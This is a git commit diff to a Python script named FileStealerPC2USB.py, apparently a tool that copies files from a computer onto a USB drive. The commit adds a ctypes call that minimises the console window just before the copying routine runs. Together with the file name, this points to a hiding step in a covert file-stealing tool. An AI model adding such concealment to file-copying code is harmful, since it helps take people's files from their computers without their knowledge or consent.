a1a0451e62f22045430f8a0a8ddfc2ffe3495d21
master <alibad979@gmail.com>
2020-05-21 16:50:22 +0430

    add region_autominimize to Class MainWindows

--- FileStealerPC2USB.py
+++ FileStealerPC2USB.py
@@ -103,6 +103,10 @@ class MainWindows:
             self.copier(driver)
 
     def copier(self,driver):
+            #region AutoMinimize
+            import ctypes
+            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)
+            #endregion
             chdir(driver)
 
             files = self.file
